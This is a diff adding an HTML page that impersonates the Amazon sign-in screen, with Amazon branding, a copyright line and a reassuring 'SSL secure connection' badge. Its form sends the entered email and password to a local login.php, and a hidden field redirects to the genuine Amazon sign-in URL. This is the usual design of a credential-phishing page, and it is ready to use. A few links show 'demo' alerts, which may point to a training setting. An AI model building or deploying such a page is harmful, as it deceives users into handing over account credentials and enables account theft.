@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign-In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Amazon Ember', Arial, sans-serif;
+        }
+        
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo h1 {
+            color: #000000;
+            font-size: 32px;
+            font-weight: 400;
+        }
+        
+        .logo span {
+            color: #0066c0;
+            font-weight: 700;
+        }
+        
+        .card {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px 26px;
+        }
+        
+        .card h2 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 20px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card label {
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: #111111;
+        }
+        
+        .card input {
+            height: 42px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px;
+            font-size: 14px;
+            padding: 0 10px;
+            margin-bottom: 15px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228,121,17,0.5);
+        }
+        
+        .card input::placeholder {
+            color: #999;
+        }
+        
+        .card button {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #111111;
+            height: 42px;
+            cursor: pointer;
+            margin: 10px 0 15px;
+            transition: all 0.2s;
+        }
+        
+        .card button:hover {
+            background: linear-gradient(to bottom, #f5d78c, #eeb933);
+        }
+        
+        .card a {
+            color: #0066c0;
+            font-size: 13px;
+            text-decoration: none;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+        
+        .card a:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+        
+        .legal {
+            font-size: 12px;
+            color: #555;
+            margin: 15px 0;
+            line-height: 1.5;
+        }
+        
+        .legal a {
+            color: #0066c0;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .legal a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            text-align: center;
+            font-size: 12px;
+            color: #767676;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #e7e7e7;
+        }
+        
+        .divider::before {
+            left: 0;
+        }
+        
+        .divider::after {
+            right: 0;
+        }
+        
+        .create-btn {
+            width: 100%;
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border: 1px solid #a2a6ac;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #111111;
+            height: 42px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.2s;
+        }
+        
+        .create-btn:hover {
+            background: linear-gradient(to bottom, #e7e9ec, #d9dce1);
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+        }
+        
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 8px;
+            font-size: 11px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .help-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 5px 0;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #555;
+        }
+        
+        @media (max-width: 400px) {
+            .card {
+                padding: 15px;
+            }
+            
+            .footer-links a {
+                display: inline-block;
+                margin: 5px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>amazon<span>.com</span></h1>
+        </div>
+        
+        <div class="card">
+            <h2>Sign in</h2>
+            
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://www.amazon.com/ap/signin">
+                
+                <label for="email">Email or mobile phone number</label>
+                <input type="text" id="email" name="email" required autofocus>
+                
+                <div class="help-row">
+                    <label for="password">Password</label>
+                    <a href="#" onclick="alert('Password help demo'); return false;">Forgot password?</a>
+                </div>
+                <input type="password" id="password" name="password" required>
+                
+                <button type="submit">Sign in</button>
+            </form>
+            
+            <div class="legal">
+                By continuing, you agree to Amazon's 
+                <a href="#" onclick="alert('Conditions demo'); return false;">Conditions of Use</a> and 
+                <a href="#" onclick="alert('Privacy demo'); return false;">Privacy Notice</a>.
+            </div>
+            
+            <div class="divider">New to Amazon?</div>
+            
+            <button class="create-btn" onclick="alert('Create account demo'); return false;">Create your Amazon account</button>
+            
+            <div class="security-badge">
+                <span>🔒</span>
+                <span>SSL secure connection</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" onclick="alert('Conditions demo'); return false;">Conditions of Use</a>
+                <a href="#" onclick="alert('Privacy demo'); return false;">Privacy Notice</a>
+                <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+            </div>
+            <div>© 1996-2025, Amazon.com, Inc. or its affiliates</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please enter your email and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input[type="text"], input[type="password"]');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#e77600';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#a6a6a6';
+                }
+            });
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.getElementById('email').focus();
+        });
+    </script>
+</body>
+</html>
